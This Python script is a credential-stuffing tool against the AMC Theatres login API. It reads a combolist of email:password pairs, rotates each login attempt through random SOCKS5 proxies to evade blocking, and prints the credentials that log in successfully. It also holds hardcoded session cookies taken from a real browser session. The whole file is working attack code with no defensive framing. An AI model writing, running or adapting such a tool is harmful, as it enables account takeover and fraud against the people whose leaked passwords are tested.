import requests, json, argparse, random

cookies = {
    'machine':
    '%7B%22onboardingTourDismissed%22%3Atrue%7D',
    'connect.sid':
    's%3A6r0XDQxXFhUASc3s-XPIY74trzFdUkgA.tT3Ht8euM1P5ZmpX47JKWSsNGn5I%2BxltbabjN4LYGT8',
    'TS01c7b029':
    '01a483b971bc02ccd19b75c65b91550cac8d0dd4dbef0870766111f9cbadab1983f57519871a26b07349051fc644d88e1214203af307a2e5ee3b1d15dc4e63e0f01285bb7fe7a3032098d32e790f7d3bdf5044f519',
    'TS0149c298':
    '01a483b9715086f517edf097e1e10e0569ab5a384b9d41815ae076cdad35b1ee71be7c6c3e492efb04d582f240d09eef1fe4ac0d0f',
    'TS01e39824':
    '01a483b9715ef60409f404cdf8834e25e61f311564bd2ca0a15ffb7614afe886ec32308b5e1f8c7832fe44d759d05b4ecc37509d7eae8a0e4829ab10a03d5590bcafcfba3280209137f46bb0a294e0d372f284f68b8ce13b784e70073242810dfe01479540',
}

headers = {
    'Origin':
    'https://www.amctheatres.com',
    'Accept-Encoding':
    'gzip, deflate, br',
    'X-AMC-Request-Id':
    'e177eec5-197e-4d46-b426-930d8b6577e3',
    'Accept-Language':
    'en-US,en;q=0.9',
    'User-Agent':
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.75 Safari/537.36',
    'content-type':
    'application/json',
    'accept':
    '*/*',
    'Referer':
    'https://www.amctheatres.com/',
    'Connection':
    'keep-alive',
}

parser = argparse.ArgumentParser()
parser.add_argument("-i", "--infile", help="Combolist input txt file")
parser.add_argument("-s", "--socks", help="Socks5 proxy txt file")
args = parser.parse_args()

prarr = []
with open(args.socks, "r") as prlist:
    for sprox in prlist:
        sprox = sprox.strip()
        prarr.append(sprox)

with open(args.infile, "r") as combofile:
    for combo in combofile:
        sesh = requests.Session()
        combo = combo.strip()
        carr = combo.split(':')
        login = carr[0]
        pdub = carr[1]
        while True:
            try:
                proxies = {'https': "socks5://" + random.choice(prarr)}
                data = {
                    'operationName':
                    'LoginModal',
                    'variables': {
                        'hasOrder': False,
                        'token': ''
                    },
                    'query':
                    'query LoginModal($token: String!, $hasOrder: Boolean!) {\n  viewer {\n    ...SocialLoginButtons_Viewer\n    order(token: $token) @include(if: $hasOrder) {\n      id\n      token\n      __typename\n    }\n    __typename\n  }\n}\n\nfragment SocialLoginButtons_Viewer on Viewer {\n  accountProviders {\n    clientId\n    provider\n    providerApiToken\n    __typename\n  }\n  __typename\n}\n'
                }
                response = sesh.post(
                    "https://graph.amctheatres.com/",
                    proxies=proxies,
                    json=data,
                    timeout=3)
                break
            except Exception as e:
                #print(e)
                continue
        while True:
            try:
                proxies = {'https': "socks5://" + random.choice(prarr)}
                data = '{"operationName":"userLogin","variables":{"input":{"email":"' + login + '","password":"' + pdub + '"}},"query":"mutation userLogin($input: LoginInput!) {\\n  userLogin(input: $input) {\\n    user {\\n      id\\n      ...featureFlagsFatQuery\\n      account {\\n        id\\n        ...accountFatQuery\\n        __typename\\n      }\\n      __typename\\n    }\\n    __typename\\n  }\\n}\\n\\nfragment accountFatQuery on Account {\\n  accountId\\n  accountType\\n  displayName\\n  emailAddress\\n  hasProductSubscription\\n  token\\n  __typename\\n}\\n\\nfragment featureFlagsFatQuery on User {\\n  sessionId\\n  account {\\n    accountId\\n    accountType\\n    featureFlagsHash\\n    hasProductSubscription\\n    productSubscription {\\n      id\\n      type\\n      typeCode\\n      __typename\\n    }\\n    __typename\\n  }\\n  __typename\\n}\\n"}'
                #print(proxies,combo)
                response = sesh.post(
                    'https://graph.amctheatres.com/',
                    proxies=proxies,
                    headers=headers,
                    data=data)
                #print (response.content)
                blob = json.loads(response.content)
                if blob['data']['userLogin'] is not None:
                    print(login + ":" + pdub)
            except Exception as e:
                #print(e)
                continue
            break